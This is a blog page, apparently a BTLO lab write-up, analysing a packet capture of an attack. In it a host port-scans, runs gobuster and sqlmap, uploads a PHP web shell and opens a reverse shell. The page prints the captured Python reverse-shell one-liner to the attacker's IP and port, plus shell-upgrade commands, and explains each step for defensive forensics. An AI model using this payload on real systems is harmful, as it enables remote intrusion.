@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        Web shell - network analysis ::
+        ladybuginthemug
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="Scenario
+The SOC received an alert in their SIEM for ‘Local to Local Port Scanning’ where an internal private IP began scanning another internal system. Can you investigate and determine if this activity is malicious or not? You have been provided a PCAP, investigate using any tools you wish.
+My usual approach is to move back and forth from general statistics to close up investigation of streams.
+PORT SCANNING # So I would start with Statistics -&amp;gt; Endpoints -&amp;gt; TCP ."
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="http://ladybuginthemug.github.io/writings/btloportscan/" />
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/style.css" />
+
+<link rel="stylesheet" href="http://ladybuginthemug.github.io/style.css" />
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://ladybuginthemug.github.io/img/apple-touch-icon-144-precomposed.png" />
+<link rel="shortcut icon" href="http://ladybuginthemug.github.io/img/favicon.png" />
+
+
+<link href="/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Web shell - network analysis"/>
+<meta name="twitter:description" content="The SOC received an alert in their SIEM for ‘Local to Local Port Scanning’ where an internal private IP began scanning another internal system."/>
+
+
+
+<meta property="og:title" content="Web shell - network analysis" />
+<meta property="og:description" content="The SOC received an alert in their SIEM for ‘Local to Local Port Scanning’ where an internal private IP began scanning another internal system." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://ladybuginthemug.github.io/writings/btloportscan/" /><meta property="article:section" content="writings" />
+
+<meta property="og:site_name" content="ladybuginthemug" />
+
+
+
+
+
+
+  </head>
+  <body >
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >pushingbuttons</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/writings/">writings</a></li>
+        
+      
+        
+          <li><a href="https://github.com/ladybuginthemug">git</a></li>
+        
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/writings/">writings</a></li>
+      
+    
+      
+        <li><a href="https://github.com/ladybuginthemug">git</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <article class="post">
+    <h1 class="post-title">Web shell - network analysis</h1>
+    <div class="post-meta">
+      
+
+      
+        <span class="post-author"
+          >— by ladybuginthemug</span
+        >
+
+
+      
+        <span class="post-read-time"
+          >— 3 min read</span
+        >
+      
+    </div>
+
+    
+
+    
+
+    <div class="post-content">
+      
+      <blockquote>
+<p>Scenario</p>
+<p>The SOC received an alert in their SIEM for ‘Local to Local Port Scanning’ where an internal private IP began scanning another internal system. Can you investigate and determine if this activity is malicious or not? You have been provided a PCAP, investigate using any tools you wish.</p>
+</blockquote>
+<p>My usual approach is to move back and forth from general statistics to close up investigation of streams.</p>
+<h3 id="port-scanning">
+  PORT SCANNING
+  <a href="#port-scanning" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>So I would start with <strong>Statistics</strong> -&gt; <strong>Endpoints</strong> -&gt; <strong>TCP</strong> .  By sorting ports we can instantly identify port incrementation that is indication of the port scanning.</p>
+<p><img src="https://github.com/ladybuginthemug/ladybuginthemug.github.io/assets/88084724/64ed0c5d-ed6f-4bb3-ad10-a3d81182d0c5" alt="ports-last"></p>
+<p>The stream reveals that <code>10.251.96.4</code> is the IP responsible for conducting the <code>TCP SYN</code> port scan activity in the port range of <code>1-1024</code></p>
+<p><img src="https://github.com/ladybuginthemug/ladybuginthemug.github.io/assets/88084724/5c3f9638-fb2e-40e2-af00-aaf537610f87" alt="TCPSYNscan"></p>
+<p>Surly enough we would be able to find more automation tools around. Simple search for user agents with <code>tshark</code> :</p>
+<pre tabindex="0"><code>└─$ tshark -r BTLOPortScan.pcap -Y &#34;http.user_agent&#34; -T fields -e http.user_agent | sort -u
+Apache/2.4.29 (Ubuntu) (internal dummy connection)
+gobuster/3.0.1
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36
+Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+sqlmap/1.4.7#stable (http://sqlmap.org)
+</code></pre><p>It will reveal the tools used which are <code>Gobuster 3.0.1</code>,
+<img src="https://github.com/ladybuginthemug/ladybuginthemug.github.io/assets/88084724/c2578128-05ad-4ecb-be9d-5fc636077665" alt="gobuster"></p>
+<p>and   <code>sqlmap 1.4.7</code></p>
+<p><img src="https://github.com/ladybuginthemug/ladybuginthemug.github.io/assets/88084724/12fab041-a8b6-46f6-a133-08a75a89bd0b" alt="sql"></p>
+<hr>
+<h3 id="file-upload">
+  FILE UPLOAD
+  <a href="#file-upload" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p><strong>Export objects</strong> -&gt; <strong>HTTP</strong></p>
+<p><img src="https://github.com/ladybuginthemug/ladybuginthemug.github.io/assets/88084724/71bdf96f-fb65-420e-af04-7efa4d6273e1" alt="upload"></p>
+<p>The attacker used <code>editprofile.php</code> to upload a web shell <code>dbfunctions.php</code>:</p>
+<pre tabindex="0"><code>&#34;16102&#34;,&#34;2021-02-07 16:40:39.693318843&#34;,&#34;10.251.96.4&#34;,&#34;10.251.96.5&#34;,&#34;HTTP&#34;,&#34;1087&#34;,&#34;POST /upload.php HTTP/1.1  (application/x-php)&#34;
+&#34;16106&#34;,&#34;2021-02-07 16:40:43.892078780&#34;,&#34;10.251.96.4&#34;,&#34;10.251.96.5&#34;,&#34;HTTP&#34;,&#34;433&#34;,&#34;GET /uploads/ HTTP/1.1 &#34;
+&#34;16110&#34;,&#34;2021-02-07 16:40:43.925237417&#34;,&#34;10.251.96.4&#34;,&#34;10.251.96.5&#34;,&#34;HTTP&#34;,&#34;401&#34;,&#34;GET /icons/unknown.gif HTTP/1.1 &#34;
+&#34;16115&#34;,&#34;2021-02-07 16:40:43.928118120&#34;,&#34;10.251.96.4&#34;,&#34;10.251.96.5&#34;,&#34;HTTP&#34;,&#34;400&#34;,&#34;GET /icons/image2.gif HTTP/1.1 &#34;
+&#34;16121&#34;,&#34;2021-02-07 16:40:45.168306955&#34;,&#34;10.251.96.4&#34;,&#34;10.251.96.5&#34;,&#34;HTTP&#34;,&#34;486&#34;,&#34;GET /uploads/dbfunctions.php HTTP/1.1 &#34;
+</code></pre><p><img src="https://github.com/ladybuginthemug/ladybuginthemug.github.io/assets/88084724/49fdf490-a307-4820-a55d-1164ebff6bc9" alt="webshell"></p>
+<p>We can spot first commands used in the web shell :</p>
+<pre tabindex="0"><code>&#34;16134&#34;,&#34;2021-02-07 16:40:51.125681644&#34;,&#34;10.251.96.4&#34;,&#34;10.251.96.5&#34;,&#34;HTTP&#34;,&#34;455&#34;,&#34;GET /uploads/dbfunctions.php?cmd=id HTTP/1.1 &#34;
+&#34;16144&#34;,&#34;2021-02-07 16:40:56.263731727&#34;,&#34;10.251.96.4&#34;,&#34;10.251.96.5&#34;,&#34;HTTP&#34;,&#34;459&#34;,&#34;GET /uploads/dbfunctions.php?cmd=whoami HTTP/1.1 &#34;
+&#34;16201&#34;,&#34;2021-02-07 16:42:35.675646891&#34;,&#34;10.251.96.4&#34;,&#34;10.251.96.5&#34;,&#34;HTTP&#34;,&#34;706&#34;,&#34;GET /uploads/dbfunctions.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.251.96.4%22,4422));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27 HTTP/1.1 &#34;
+</code></pre><p>The last request is trying to exploit a vulnerability in the server by injecting a Python one-liner that establishes a reverse shell connection to the specified IP and port in the following steps:</p>
+<ul>
+<li>Imports the socket, subprocess, and os modules.</li>
+</ul>
+<pre tabindex="0"><code>python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+</code></pre><ul>
+<li>Creates a socket and connects to the IP address 10.251.96.4 on port 4422.</li>
+</ul>
+<pre tabindex="0"><code>s.connect((&#34;10.251.96.4&#34;,4422));
+</code></pre><ul>
+<li>Duplicates the socket&rsquo;s file descriptor to the standard input (0), standard output (1), and standard error (2).</li>
+</ul>
+<pre tabindex="0"><code>os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
+</code></pre><ul>
+<li>Calls /bin/sh (a shell) with the -i flag, which starts an interactive shell.</li>
+</ul>
+<pre tabindex="0"><code>p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);
+</code></pre><hr>
+<h3 id="shell-connection">
+  SHELL CONNECTION
+  <a href="#shell-connection" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p><img src="https://github.com/ladybuginthemug/ladybuginthemug.github.io/assets/88084724/52058542-85ec-48c7-b96f-916ca5739572" alt="shell-python"></p>
+<p>Following tcp stream on port 4422, we can confirm that the reverse shell connection is established.</p>
+<p>The attempts to escalate privileges appear to have been made by executing commands such as <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code> and <code>bash -i</code>. These commands are commonly used to attempt to gain a more interactive shell or elevate privileges.</p>
+<p>However, there is no explicit indication in the log that these privilege escalation attempts were successful. The user continues to operate with the same username <code>www-data</code> and there are no indications of a change in privileges or access to restricted areas of the file system.</p>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h"
+              >read other posts</span
+            >
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="http://ladybuginthemug.github.io/writings/bestemployee/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">BTLO File Carving</span>
+                </a>
+              </span>
+            
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+      
+    
+  </article>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >pushingbuttons</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2024 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span><a href="https://github.com/panr/hugo-theme-hello-friend" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
